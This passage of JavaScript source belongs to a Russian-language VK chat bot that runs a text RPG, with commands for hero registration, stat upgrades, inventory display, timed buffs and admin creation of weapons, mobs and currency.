				if(g <= 8) ups = `${ups}&#8419;`
				if(g == 9) ups = `&#128287;`
				yo.push({
					name: tops[g].name,
					id: tops[g].id,
					type: tops[g].type,
					level: tops[g].level,
					count: tops[g].count,
					rarity: tops[g].rarity,
					class: tops[g].class,
					price: tops[g].price
				})
			}
		}
		var people = "📦 Ваш инвентарь:\n" + yo.map(a => "• " + a.name + " [🆔 " + a.id + "] " + "\n" + "&#4448;• 🔗 Тип: " + a.type + "\n" + "&#4448;• 💡 Уровень: " + a.level + "\n" + "&#4448;• 🔱 Редкость: " + a.rarity + "\n" + "&#4448;• ⚔ Бонус Урона / Брони: " + a.count + "\n" + "&#4448;• 👥 Класс: " + a.class + "\n" + "&#4448;• 💰 Цена: " + spaces(a.price) + " золота\n").join("\n")
		text += `${people}\n\n`;
		return context.send(text);
	});

 	vk.updates.hear(/^(?:!вознесение)\s?([^]+)?/i, (context) => {
		if(rpg.users[user_id(context.user)].registered != true) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), Вы не зарегистрированы! Введите "!создать"`);
		let user = rpg.users[user_id(context.user)];
		let i = context.$match[1]
			if(user.points <= 0) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), у Вас нет очков вознесения!`)
				if(!i) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), Каждое ОВ можно потратить на одну из характеристик.\n• "!вознесение здоровье" - улучшит характеристику Здоровье\n• "!вознесение защита" - улучшит характеристику Защита\n• "!вознесение атака" - улучшит характеристику Атака`)
		if(i != `здоровье` && i != `хп` && i != `защита` && i != `дп` && i != `атака` && i != `урон`) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), неверная цель вознесения!`)
		if(i == `здоровье` || i == `хп`) {
			let x = [1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3].random();
			user.points -= 1;
			user.hp += Number(x);
			return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), после возвышения Ваш герой получил +${x} к Здоровью`)
		}
		if(i == `защита` || i == `дп`) {
			let x = [1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3].random();
			user.points -= 1;
			user.defence += Number(x);
			return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), после возвышения Ваш герой получил +${x} к Защите`)
		}
		if(i == `атака` || i == `урон`) {
			let x = [1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3].random();
			user.points -= 1;
			user.damage += Number(x);
			return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), после возвышения Ваш герой получил +${x} к Атаке`)
		}
	});

	/*vk.updates.hear(/^(?:!свиток|!свитки)\s?([^]+)?/i, (context) => {
		if(rpg.users[user_id(context.user)].registered != true) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), Вы не зарегистрированы! Введите "!создать"`);
		let i = context.$match[1]
		let user = rpg.users[user_id(context.user)];
		if(!i){
		 	if(user.card <= 0) return context.send(`📛 У вас нет Свитков Героя.`);
		 	user.card -= 1;
		 	let new_card = card(user);

		 	return context.send(`
		 		⏩ Вы использовали Свиток Героя
		 		🗡 Характеристика "${new_card[0].toString().replace(/hp/gi, "Здоровье").replace(/defence/gi, "Защита").replace(/damage/gi, "Атака").replace(/exp/gi, "Опыт")}"
		 		➕ Увеличена на ${new_card[1]}
		 		📛 "!свитки все" - использует все свитки.
		 	`, {attachment: new_card[2]});
	 	}
	 	if(i == 'все' || i == 'всё'){
	 		let cards = 0;
	 		let texts = '';
	 		if(user.card <= 0) return context.send(`📛 У вас нет Свитков Героя.`);
	 		for(z=0;z=user.card;z++){
	 			cards += 1;
	 			user.card -= 1;
		 		let new_card = card(user);
		 		texts += `• +${new_card[1]} к ${new_card[0].toString().replace(/hp/gi, "Здоровью").replace(/defence/gi, "Защите").replace(/damage/gi, "Атаке").replace(/exp/gi, "Опыту")}\n`
	 		}
			let new_card = card(user);
	 		let text = `Вы использовали ${cards} Свитков Героя\n`;
	 		return context.send(text+texts, {attachment: new_card[3]});
	 	}
	 	return context.send(`📛 Чтобы использовать свиток, напишите: "!свиток"`);
	});

function card(user){
	card_hp = [1,2,3,4,5].random();
	card_hp_url = [0,'photo-142655181_457243644', 'photo-142655181_457243644', 'photo-142655181_457243644', 'photo-142655181_457243644', 'photo-142655181_457243644']
	////////
	card_defence = [1,2,3,4,5].random();
	card_defence_url = [0,'photo-142655181_457243644', 'photo-142655181_457243644', 'photo-142655181_457243644', 'photo-142655181_457243644', 'photo-142655181_457243644']
	////////
	card_damage = [1,2,3,4,5].random();
	card_damage_url = [0,'photo-142655181_457243644', 'photo-142655181_457243645', 'photo-142655181_457243644', 'photo-142655181_457243645', 'photo-142655181_457243644']
	////////
	card_exp = [1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,100].random();
	card_exp_url = [0,'photo-142655181_457243644', 'photo-142655181_457243644', 'photo-142655181_457243644', 'photo-142655181_457243644', 'photo-142655181_457243644']
	////////
	card_all_url = [0,'photo-142655181_457243646']
	let a = rand(1,4);
	if(a == 1){
		user.hp += Number(card_hp);
		return ['hp', card_hp, card_hp_url[card_hp], card_all_url];
	}
	if(a == 2){
		user.defence += Number(card_defence);
		return ['defence', card_defence, card_defence_url[card_defence], card_all_url];
	}
	if(a == 3){
		user.damage += Number(card_damage);
		return ['damage', card_damage, card_damage_url[card_damage], card_all_url];
	}
	if(a == 4){
		user.exp += Number(card_exp);
		return ['exp', card_exp, card_exp_url[card_exp], card_all_url];
	}
}*/

function text_hero(){
	let text = '';
	for(i=1;i<7;i++){
		var h = heros[i];
		text += `⏩ Герой: ${h.group}
		📜 Описание: ${h.text}
		- - - - -
		`
	}
	return text
}

function weapon_stats(user){
	let text = '';
	for(i=1;i<weapons.weaps+1;i++){
		var w = weapons[i];
        if(w.class == user.class){
		text += `${i}. ${w.name}\n&#4448;• 💰 Цена: ${w.price} золота

		`
        }
	}
	text += `📜 Для получения подробной информации о товаре введи "!описание ID"`
	return text
}

	vk.updates.hear(/^(?:!описание)\s?([0-9]+)?/i, (context) => {
		let i = context.$match[1]
		let w = weapons[i];
		return context.send(`• ${w.name}
		&#4448;• ⚔ Урон: ${w.count}
		&#4448;• 👥 Класс: ${w.class}
		&#4448;• 💰 Цена: ${w.price} золота
		&#4448;&#4448;• 🆔 ID: ${i}
		&#4448;&#4448;&#4448;• ✅ Для покупки введи "!таверна ID"
`)
	});

const heros = {
	"1": {
		group: "Маг",
		text: `Маг — герой, способный управлять всеми стихиями. Если он захочет, он подчинит себе всё. [ID 1]`
	},
	"2": {
		group: "Инженер",
		text: `Инженер — герой, чьи технологии и машины позволяют выполнить любую задачу. Столкнувшись с ним лицом к лицу, следите за каждым движением, возможно, он уже победил. [ID 2]`
	},
	"3": {
		group: "Воин",
		text: `Воин — герой войны. Нерушимость и целеустремленность, вот основы победы. [ID 3]`
	},
	"4": {
		group: "Законник",
		text: `Законник — герой справедливости. Он будет биться до тех пор, пока его врага не настигнет кара правосудия.. [ID 4]`
	},
	"5": {
		group: "Жрец",
		text: `Жрец — герой поддержки. Его цель защитить команду, остальное его не волнует. [ID 5]`
	},
	"6": {
		group: "Божество",
		text: `Божество — герой, явившийся в этот мир с небес. Его интеллект и сила гораздо выше, чем у простых героев, потому и победить его труднее. [VIP][ID 6]`
	}
}


	vk.updates.hear(/^(?:🧙 Маг)$/i, async (context, bot) => {
	if(rpg.users[user_id(context.user)].registered == true) return context.send(`@id${context.user} (${user.prefix}), Вы уже зарегистрированы!`);
	let user = rpg.users[user_id(context.user)];
	let id = user_id(context.user);
	rpg.users[user_id(context.user)].heroid = 1
	rpg.users[user_id(context.user)].class = heros[1].group
	vk.api.call("contexts.send", {
				peer_id: 270911031,
				message: `🕸 ➾ [RPG]\n🆕 ➾ @id${context.user} (Новый игрок)\n👥 ➾ Класс: ${rpg.users[user_id(context.user)].class}\n✅ ➾ ID: ${rpg.users[user_id(context.user)].aid}`
				}).then((res) => {}).catch((error) => {console.log('ошибка передачи данных о новом рпг пользователе'); });
				return context.send(`
			✅ Ваш герой: ${heros[1].group}

			🔯 Характеристики:
			❤ Здоровье: 1
			🛡 Защита: 1
			⚔ Атака: 1
			- - - - -
			🔸 Здоровье, защита, атака
			🔸 При атаке на других игроков складываются
			🔸 Сражаться с другими игроками можно,
			🔸 Достигнув 3 ранга.
			🔸 Уровень героя можно повысить,
			🔸 Обучая и улучшая персонажа,
			🔸 И участвуя поединках.
				[ВАЖНО!] ✏ Дайте имя своему персонажу для завершения регистрации. Команда "!ник".
			`)
});

	vk.updates.hear(/^(?:👨‍🔧 Инженер)$/i, async (context, bot) => {
	if(rpg.users[user_id(context.user)].registered == true) return context.send(`@id${context.user} (${user.prefix}), Вы уже зарегистрированы!`);
	let user = rpg.users[user_id(context.user)];
	let id = user_id(context.user);
	rpg.users[user_id(context.user)].heroid = 2
	rpg.users[user_id(context.user)].class = heros[2].group
	vk.api.call("contexts.send", {
				peer_id: 270911031,
				message: `🕸 ➾ [RPG]\n🆕 ➾ @id${context.user} (Новый игрок)\n👥 ➾ Класс: ${rpg.users[user_id(context.user)].class}\n✅ ➾ ID: ${rpg.users[user_id(context.user)].aid}`
				}).then((res) => {}).catch((error) => {console.log('ошибка передачи данных о новом рпг пользователе'); });
				return context.send(`
			✅ Ваш герой: ${heros[2].group}

			🔯 Характеристики:
			❤ Здоровье: 1
			🛡 Защита: 1
			⚔ Атака: 1
			- - - - -
			🔸 Здоровье, защита, атака
			🔸 При атаке на других игроков складываются
			🔸 Сражаться с другими игроками можно,
			🔸 Достигнув 3 ранга.
			🔸 Уровень героя можно повысить,
			🔸 Обучая и улучшая персонажа,
			🔸 И участвуя поединках.
				[ВАЖНО!] ✏ Дайте имя своему персонажу для завершения регистрации. Команда "!ник".
			`)
});

	vk.updates.hear(/^(?:⚔ Воин)$/i, async (context, bot) => {
	if(rpg.users[user_id(context.user)].registered == true) return context.send(`@id${context.user} (${user.prefix}), Вы уже зарегистрированы!`);
	let user = rpg.users[user_id(context.user)];
	let id = user_id(context.user);
	rpg.users[user_id(context.user)].heroid = 3
	rpg.users[user_id(context.user)].class = heros[3].group
	vk.api.call("contexts.send", {
				peer_id: 270911031,
				message: `🕸 ➾ [RPG]\n🆕 ➾ @id${context.user} (Новый игрок)\n👥 ➾ Класс: ${rpg.users[user_id(context.user)].class}\n✅ ➾ ID: ${rpg.users[user_id(context.user)].aid}`
				}).then((res) => {}).catch((error) => {console.log('ошибка передачи данных о новом рпг пользователе'); });
				return context.send(`
			✅ Ваш герой: ${heros[3].group}

			🔯 Характеристики:
			❤ Здоровье: 1
			🛡 Защита: 1
			⚔ Атака: 1
			- - - - -
			🔸 Здоровье, защита, атака
			🔸 При атаке на других игроков складываются
			🔸 Сражаться с другими игроками можно,
			🔸 Достигнув 3 ранга.
			🔸 Уровень героя можно повысить,
			🔸 Обучая и улучшая персонажа,
			🔸 И участвуя поединках.
				[ВАЖНО!] ✏ Дайте имя своему персонажу для завершения регистрации. Команда "!ник".
			`)
});

	vk.updates.hear(/^(?:🤠 Законник)$/i, async (context, bot) => {
	if(rpg.users[user_id(context.user)].registered == true) return context.send(`@id${context.user} (${user.prefix}), Вы уже зарегистрированы!`);
	let user = rpg.users[user_id(context.user)];
	let id = user_id(context.user);
	rpg.users[user_id(context.user)].heroid = 4
	rpg.users[user_id(context.user)].class = heros[4].group
	vk.api.call("contexts.send", {
				peer_id: 270911031,
				message: `🕸 ➾ [RPG]\n🆕 ➾ @id${context.user} (Новый игрок)\n👥 ➾ Класс: ${rpg.users[user_id(context.user)].class}\n✅ ➾ ID: ${rpg.users[user_id(context.user)].aid}`
				}).then((res) => {}).catch((error) => {console.log('ошибка передачи данных о новом рпг пользователе'); });
				return context.send(`
			✅ Ваш герой: ${heros[4].group}

			🔯 Характеристики:
			❤ Здоровье: 1
			🛡 Защита: 1
			⚔ Атака: 1
			- - - - -
			🔸 Здоровье, защита, атака
			🔸 При атаке на других игроков складываются
			🔸 Сражаться с другими игроками можно,
			🔸 Достигнув 3 ранга.
			🔸 Уровень героя можно повысить,
			🔸 Обучая и улучшая персонажа,
			🔸 И участвуя поединках.
				[ВАЖНО!] ✏ Дайте имя своему персонажу для завершения регистрации. Команда "!ник".
			`)
});

	vk.updates.hear(/^(?:☯ Жрец)$/i, async (context, bot) => {
	if(rpg.users[user_id(context.user)].registered == true) return context.send(`@id${context.user} (${user.prefix}), Вы уже зарегистрированы!`);
	let user = rpg.users[user_id(context.user)];
	let id = user_id(context.user);
	rpg.users[user_id(context.user)].heroid = 5
	rpg.users[user_id(context.user)].class = heros[5].group
	vk.api.call("contexts.send", {
				peer_id: 270911031,
				message: `🕸 ➾ [RPG]\n🆕 ➾ @id${context.user} (Новый игрок)\n👥 ➾ Класс: ${rpg.users[user_id(context.user)].class}\n✅ ➾ ID: ${rpg.users[user_id(context.user)].aid}`
				}).then((res) => {}).catch((error) => {console.log('ошибка передачи данных о новом рпг пользователе'); });
				return context.send(`
			✅ Ваш герой: ${heros[5].group}

			🔯 Характеристики:
			❤ Здоровье: 1
			🛡 Защита: 1
			⚔ Атака: 1
			- - - - -
			🔸 Здоровье, защита, атака
			🔸 При атаке на других игроков складываются
			🔸 Сражаться с другими игроками можно,
			🔸 Достигнув 3 ранга.
			🔸 Уровень героя можно повысить,
			🔸 Обучая и улучшая персонажа,
			🔸 И участвуя поединках.
				[ВАЖНО!] ✏ Дайте имя своему персонажу для завершения регистрации. Команда "!ник".
			`)
});

	vk.updates.hear(/^(?:👼 Божество)$/i, async (context, bot) => {
	if(rpg.users[user_id(context.user)].registered == true) return context.send(`@id${context.user} (${user.prefix}), Вы уже зарегистрированы!`);
	let user = rpg.users[user_id(context.user)];
	let id = user_id(context.user);
	if(user.level < 1) return context.send(`Данный персонаж доступен только для VIP игроков.`)
	rpg.users[user_id(context.user)].heroid = 6
	rpg.users[user_id(context.user)].class = heros[6].group
	vk.api.call("contexts.send", {
				peer_id: 270911031,
				message: `🕸 ➾ [RPG]\n🆕 ➾ @id${context.user} (Новый игрок)\n👥 ➾ Класс: ${rpg.users[user_id(context.user)].class}\n✅ ➾ ID: ${rpg.users[user_id(context.user)].aid}`
				}).then((res) => {}).catch((error) => {console.log('ошибка передачи данных о новом рпг пользователе'); });
				return context.send(`
			✅ Ваш герой: ${heros[6].group}

			🔯 Характеристики:
			❤ Здоровье: 1
			🛡 Защита: 1
			⚔ Атака: 1
			- - - - -
			🔸 Здоровье, защита, атака
			🔸 При атаке на других игроков складываются
			🔸 Сражаться с другими игроками можно,
			🔸 Достигнув 3 ранга.
			🔸 Уровень героя можно повысить,
			🔸 Обучая и улучшая персонажа,
			🔸 И участвуя поединках.
				[ВАЖНО!] ✏ Дайте имя своему персонажу для завершения регистрации. Команда "!ник".
			`)
});

	vk.updates.hear(/^(?:👨‍🔧 Инженер)$/i, async (context, bot) => {
	if(rpg.users[user_id(context.user)].registered == true) return context.send(`@id${context.user} (${user.prefix}), Вы уже зарегистрированы!`);
	let user = rpg.users[user_id(context.user)];
	let id = user_id(context.user);
	rpg.users[user_id(context.user)].heroid = 2
	rpg.users[user_id(context.user)].class = heros[2].group
	vk.api.call("contexts.send", {
				peer_id: 270911031,
				message: `🕸 ➾ [RPG]\n🆕 ➾ @id${context.user} (Новый игрок)\n👥 ➾ Класс: ${rpg.users[user_id(context.user)].class}\n✅ ➾ ID: ${rpg.users[user_id(context.user)].aid}`
				}).then((res) => {}).catch((error) => {console.log('ошибка передачи данных о новом рпг пользователе'); });
				return context.send(`
			✅ Ваш герой: ${heros[2].group}

			🔯 Характеристики:
			❤ Здоровье: 1
			🛡 Защита: 1
			⚔ Атака: 1
			- - - - -
			🔸 Здоровье, защита, атака
			🔸 При атаке на других игроков складываются
			🔸 Сражаться с другими игроками можно,
			🔸 Достигнув 3 ранга.
			🔸 Уровень героя можно повысить,
			🔸 Обучая и улучшая персонажа,
			🔸 И участвуя поединках.
				[ВАЖНО!] ✏ Дайте имя своему персонажу для завершения регистрации. Команда "!ник".
			`)
});

/////////////////////////////////RPG/////////////////////////////////
//////////////////////////////RPG ADMIN//////////////////////////////
	vk.updates.hear(/^(?:!set)\s([0-9]+)\s(.*)\s(.*)$/i, async (context, bot) => {
	if(rpg.users[user_id(context.user)].level < 2) return;
	if(Number(context.$match[3])) context.$match[3] = Math.floor(Number(context.$match[3]));
	let user = rpg.users[user_id(context.user)];
	let us = rpg.users[context.$match[1]];
	let id = user_id(context.user);
	let owner = rpg.users[id].owner;
	if(context.$match[3] == "true" || context.$match[3] == "false") context.$match[3] = context.$match[3] == "true" ? true : false;
    if(context.$match[3] == "{}") context.$match[3] = context.$match[3] == "{}" ? {} : {};
	if(!user) return context.send(`неверный ID игрока`);

	if(user[context.$match[2]] == null) return context.send(`такого поля не существует`);
	us[context.$match[2]] = context.$match[3];

	return context.send(`Вы сменили поле '${context.$match[2]}' игроку ${rpg.users[context.$match[1]].prefix} на значение '${context.$match[3]}'`);
});

	vk.updates.hear(/^(?:!elem)\s?([0-9]+)?/i,  (context) => {
	if(rpg.users[user_id(context.user)].level < 2) return;
	let user = rpg.users[user_id(context.user)];
	let i = context.$match[1];
	if(!i) return context.send(`ID типов существ:
1 - Эльдрази
2 - Человек

ID цветов:
0 - бесцветный
1 - белый
2 - синий
3 - черный
4 - красный
5 - зеленый
`);
	if(i < 0 || i > 5) return;
	world.element = i
	return context.send(`Установлен Элемент - ${i.toString().replace(/0/gi, "Пустота").replace(/1/gi, "Свет").replace(/2/gi, "Вода").replace(/3/gi, "Тьма").replace(/4/gi, "Огонь").replace(/5/gi, "Земля")}`);
});

	vk.updates.hear(/^(?:!forcew)\s?([0-9]+)?/i,  (context) => {
	if(rpg.users[user_id(context.user)].level < 2) return;
	let user = rpg.users[user_id(context.user)];
	let hour = new Date().getHours() + 3
	let minute = new Date().getMinutes()
	let time = `${nols(hour)}:${nols(minute)}`
	let x = context.$match[1];
			world.element = x
			api.messages.send({
			chat_id: 33,
			message: `
🌐 #Мир [${time}]
⚡ Разлом мутировал > Элемент: ${x.toString().replace(/0/gi, "Пустота").replace(/1/gi, "Свет").replace(/2/gi, "Вода").replace(/3/gi, "Тьма").replace(/4/gi, "Огонь").replace(/5/gi, "Земля")} 👁‍🗨
🖤 Здоровье Костоклада | ${world.bonehoard.starthp} (+${world.bonehoard.gainhp}) |`
			})
});

	vk.updates.hear(/^(?:!world|!мир)\s?([0-9]+)?/i,  (context) => {
	let user = rpg.users[user_id(context.user)];
	let hour = new Date().getHours() + 3
	let minute = new Date().getMinutes()
	let time = `${nols(hour)}:${nols(minute)}`
	return context.send(`
🌐 #Мир [${time}]
⚡ Элемент Разлома: ${world.element.toString().replace(/0/gi, "Пустота").replace(/1/gi, "Свет").replace(/2/gi, "Вода").replace(/3/gi, "Тьма").replace(/4/gi, "Огонь").replace(/5/gi, "Земля")} 👁‍🗨
🖤 Здоровье Костоклада | ${world.bonehoard.starthp} (+${world.bonehoard.gainhp}) |
`)
});

	vk.updates.hear(/^(?:!усиление)\s?([0-9]+)?/i,  async (context) => {
		if(rpg.users[user_id(context.user)].level < 2) return;
		let users = await api.messages.getConversationMembers({peer_id: 2000000000 + context.chatId, fields: "first_name"})
		let time = Number(context.$match[1])
		let text = ``
		for(i in users.profiles){
			let user = rpg.users[user_id(users.profiles[i].id)]
			if(user){
				if(time == 0){
					user.improvetime = 0;
					user.damage -= user.impdamage
					user.defence -= user.impdefence
					user.impdamage = 0
					user.impdefence = 0
					text += `${users.profiles[i].first_name} => усиление обнулено\n`
				}
				else if(user.improvetime > 0 && time != 0){
					user.improvetime += time
					text += `${users.profiles[i].first_name} уже имеет усиление, но получает +${time} минут! ${user.damage} ${user.impdamage} ${user.defence} ${user.impdefence}\n`
				}else{
				let fDMG = user.damage
				let fDef = user.defence
				let nDMG = fDMG + (fDMG / 100 * 10) + 5
				let nDef = fDef + (fDef / 100 * 10) + 5
				user.damage = Math.round(nDMG)
				user.defence = Math.round(nDef)
				user.impdamage = Math.round((fDMG / 100 * 10) + 5)
				user.impdefence = Math.round((fDef / 100 * 10) + 5)
				user.improvetime = time
			text += `${users.profiles[i].first_name} получает усиление на ${time} минут! ${user.damage} ${user.impdamage} ${user.defence} ${user.impdefence}\n`
				}
			}
		}
		return context.send(text)
	});

	vk.updates.hear(/^(?:!усил)\s?([0-9]+)?/i,  async (context) => {
		let user = rpg.users[user_id(context.user)]
		return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n=> Оставшееся время усиления: ${user.improvetime} минут`)
	});

 	setInterval(() =>{
 		for(i in rpg.users){
            let user = rpg.users[i];
 			 if(user.improvetime > 0){
                 user.improvetime -= 1
                    if(user.improvetime <= 0){
                    user.improvetime = 0;
					user.damage -= user.impdamage
					user.defence -= user.impdefence
					user.impdamage = 0
					user.impdefence = 0
					if(user.chat != null){
					api.messages.send({
					peer_id: 2000000000 + user.chat,
					message: `
					@id${user.id} (${user.prefix}),\n=> Закончилось время усиления!
					`
					})
					}else{
					api.messages.send({
					peer_id: user.id,
					message: `
					Закончилось время усиления!
					`
					})
					}
                 }
 			 }
 		}
 	}, 60000);

	vk.updates.hear(/^(?:!мобы|!mobs)\s?([0-9]+)?/i,  (context) => {
		let x = context.$match[1]
		let text = ``;
		var tops = []
		let c = 0;
		for (i in mobs) {
		if(mobs[i].element == x){
			tops.push({
				id: i,
				name: mobs[i].name,
				elem: mobs[i].element
			})
			c++
		}

		}
		tops.sort(function(a, b) {
			if (b.id > a.id) return 1
			if (b.id < a.id) return -1
			return 0
		})
		var yo = []

		for (var g = 0; g < c; g++) {
			if (tops.length > g) {
				let ups = g;
				ups += 1;
				if(g <= 8) ups = `${ups}&#8419;`
				if(g == 9) ups = `&#128287;`
				yo.push({
					id: tops[g].id,
					name: tops[g].name,
					elem: tops[g].elem,
					smile: `${ups}`
				})
			}
		}
		var people = "🌐 Массив мобов с элементом " + "[" + x.toString().replace(/0/gi, "Пустота").replace(/1/gi, "Свет").replace(/2/gi, "Вода").replace(/3/gi, "Тьма").replace(/4/gi, "Огонь").replace(/5/gi, "Земля") + "] 💠 \n" + yo.map(a => a.id + ". " + a.name + " | Элемент: " + a.elem.toString().replace(/0/gi, "Пустота").replace(/1/gi, "Свет").replace(/2/gi, "Вода").replace(/3/gi, "Тьма").replace(/4/gi, "Огонь").replace(/5/gi, "Земля")).join("\n")
		text += `${people}\n\n`;
		context.send(text);
	});

vk.updates.hear(/^(?:!псоздать)\s?([0-9]+)?\s([0-9]+)?\s([0-9]+)?\s([^]+)?/i,  (context) => {
	let user = rpg.users[user_id(context.user)];
	let m1 = context.$match[1];
	let m2 = context.$match[2];
	let m3 = context.$match[3];
	let m4 = context.$match[4];
	if(user.level < 2) return context.send(`@id${context.user} (${user.prefix}), у Вас нет доступа к данной команде!`);
	if(!Number(m1)) return context.send(`Цена должна быть числом!`);
	if(!Number(m2)) return context.send(`Урон должен быть числом!`);
	if(!Number(m3)) return context.send(`Класс должен быть числом!`);
	if(!Number(m3) > 6) return context.send(`Всего 6 классов. ${text_hero()}`);
	weapons.weaps +=1
	weapons[weapons.weaps] = {
		name: m4,
		count: Number(m2),
		class: Number(m3).toString().replace(/1/gi, "Маг").replace(/2/gi, "Инженер").replace(/3/gi, "Воин").replace(/4/gi, "Законник").replace(/5/gi, "Жрец").replace(/6/gi, "Божество"),
		price: Number(m1),
	};
			vk.api.call("contexts.send", {
				peer_id: rpg.users[1].id,
				message: `🕸 ➾ [RPG]\n🆕 ➾ Новый предмет\n🛠 ➾ Название: ${m4}\n⚔ Урон: ${m2}\n👥 Класс: ${m3.toString().replace(/1/gi, "Маг").replace(/2/gi, "Инженер").replace(/3/gi, "Воин").replace(/4/gi, "Законник").replace(/5/gi, "Жрец").replace(/6/gi, "Божество")}\n💰 Цена: ${m1}`
				}).then((res) => {}).catch((error) => {console.log('ошибка передачи данных о новом рпг предмете'); });
				return context.send(`🕸 ➾ [RPG]\n🆕 ➾ Новый предмет успешно создан!\n🛠 ➾ Название: ${m4}\n⚔ ➾ Урон: ${m2}\n👥 ➾ Класс: ${m3.toString().replace(/1/gi, "Маг").replace(/2/gi, "Инженер").replace(/3/gi, "Воин").replace(/4/gi, "Законник").replace(/5/gi, "Жрец").replace(/6/gi, "Божество")}\n💰 Цена: ${m1}
			`)
});

vk.updates.hear(/^(?:!!мсоздать)/i,  (context) => {
	return context.send(`
Урон
ХП
Тип:
1 - Эльдрази
2 - Человек
3 - Эльф
4 - Зверь
5 - Элементаль
6 - Насекомое
7 - Вурм
8 - Паук
9 - Дракон
Цвет:
0 - бесцветный
1 - белый
2 - синий
3 - черный
4 - красный
5 - зеленый
Имя
	`);
});
vk.updates.hear(/^(?:!мсоздать)\s([0-9]+)?\s([0-9]+)?\s([0-9]+)?\s([0-9]+)?\s([^]+)?/i,  (context) => {
	let user = rpg.users[user_id(context.user)];
	let m1 = context.$match[1];
	let m2 = context.$match[2];
	let m3 = context.$match[3];
	let m4 = context.$match[4];
	let m5 = context.$match[5];
	if(user.level < 2) return context.send(`@id${context.user} (${user.prefix}), у Вас нет доступа к данной команде!`);
	if(!Number(m1)) return context.send(`Урон должны быть числом!`);
	if(!Number(m2)) return context.send(`HP должны быть числом!`);
	if(!Number(m3)) return context.send(`Тип должен быть числом!`);
	if(m4 < 0) return context.send(`Цвет должен быть числом!`);
	mobs.number +=1
	mobs[mobs.number] = {
		name: m5,
		damage: Number(m1),
		hp: Number(m2),
		type: m3,
		element: m4,
		pic: null,
		description: 'Нет данных.'
	};
			api.messages.send({
				user_id: rpg.users[1].id,
				message: `🕸 ➾ [RPG]\n🆕 ➾ Новый моб\n🛠 ➾ Имя: ${m5}\n⚔ Статы: ${m1} / ${m2}`
				}).then((res) => {}).catch((error) => {console.log('ошибка передачи данных о новом мобе'); });
				return context.send(`🕸 ➾ [RPG]\n🆕 ➾ Новый моб успешно создан!\n🛠 ➾ Название: ${m5}\n⚔ Урон: ${m1}\n❤ Жизни: ${m2}\n⚪ Тип: ${m3.toString().replace(/1/gi, "Эльдрази").replace(/2/gi, "Человек").replace(/3/gi, "Эльф").replace(/4/gi, "Зверь").replace(/5/gi, "Элементаль").replace(/6/gi, "Насекомое").replace(/7/gi, "Вурм").replace(/8/gi, "Паук").replace(/9/gi, "Драконы").replace(/9/gi, "Драконы")}\n⚪ Элемент: ${m4.toString().replace(/0/gi, "Пустота").replace(/1/gi, "Свет").replace(/2/gi, "Вода").replace(/3/gi, "Тьма").replace(/4/gi, "Огонь").replace(/5/gi, "Земля")}\n🔎 ID: ${mobs.number}
			`)
});

/* ID типов существ:
1 - Эльдрази
2 - Человек
3 - Эльф
4 - Зверь
5 - Элементаль
6 - Насекомое
7 - Вурм
9 - Паук

ID цветов:
0 - бесцветный
1 - белый
2 - синий
3 - черный
4 - красный
5 - зеленый
*/

vk.updates.hear(/^(?:!!моб)\s?([0-9]+)?\s([^]+)?/i,  (context) => {
	let user = rpg.users[user_id(context.user)];
	if(user.level < 2) return context.send(`@id${context.user} (${user.prefix}), у Вас нет доступа к данной команде!`);
	mobs[context.$match[1]].description = context.$match[2]
			vk.api.call("contexts.send", {
				peer_id: rpg.users[1].id,
				message: `🕸 ➾ [RPG]\n🆕 ➾ Изменено описание моба\n🛠 ➾ Название: ${mobs[context.$match[1]].name}\n📜 Описание: ${context.$match[2]}`
				}).then((res) => {}).catch((error) => {console.log('ошибка передачи данных о новом мобе'); });
				return context.send(`🕸 ➾ [RPG]\n🆕 ➾ Изменено описание моба\n🛠 ➾ Название: ${mobs[context.$match[1]].name}\n📜 ➾ Описание: ${context.$match[2]}
			`)
});

 	vk.updates.hear(/^(?:giveitem)\s?([0-9]+)?/i, (context) => {
        let user = rpg.users[context.$match[1]];
		let users = rpg.users[user_id(context.user)];
		if(users.level < 2) return;
        item_drop(user)
		return context.send(`Выдано!`);
 	});

 	vk.updates.hear(/^(?:givegold)\s?([0-9]+)?\s?([0-9]+)?/i, (context) => {
 		let user = rpg.users[user_id(context.user)];
 		if(user.level < 2) return;
 		let ids = Number(context.$match[1])
 		let i = Number(context.$match[2])
 		if(!rpg.users[ids]) return context.send(`Неверный ID`);
		if(!ids) return context.send(`Пример: givegold 1 10`);
		if(!i) return context.send(`Введите количество золота!`)
 		rpg.users[ids].gold += Number(i);
 		return context.send(`@id${rpg.users[ids].id} (${rpg.users[ids].prefix}) получил ${i} золота`);
 	});

 	vk.updates.hear(/^(?:givediam)\s?([0-9]+)?\s?([0-9]+)?/i, (context) => {
 		let user = rpg.users[user_id(context.user)];
 		if(user.level < 2) return;
 		let ids = Number(context.$match[1])
 		let i = Number(context.$match[2])
 		if(!rpg.users[ids]) return context.send(`Неверный ID`);
		if(!ids) return context.send(`Пример: givediam 1 10`);
		if(!i) return context.send(`Введите количество бриллиантов!`)
 		rpg.users[ids].diamond += Number(i);
 		return context.send(`@id${rpg.users[ids].id} (${rpg.users[ids].prefix}) получил ${i} бриллиантов`);
 	});

 	vk.updates.hear(/^(?:ssl)\s?([0-9]+)?\s?([0-9]+)?/i, (context) => {
 		let user = rpg.users[user_id(context.user)];
 		if(user.level < 2) return;
 		let ids = Number(context.$match[1])
 		let i = Number(context.$match[2])
 		if(!rpg.users[ids]) return context.send(`Неверный ID`);
 		rpg.users[ids].skill.level = Number(i);
 		return context.send(`@id${rpg.users[ids].id} (${rpg.users[ids].prefix}) получил ${i} уровень навыка`);
 	});

run()
api.messages.send({
peer_id: 270911031,
message: `Я запустился!`
}).then((res) => {}).catch((error) => {console.log('ошибка передачи данных об включении'); });;


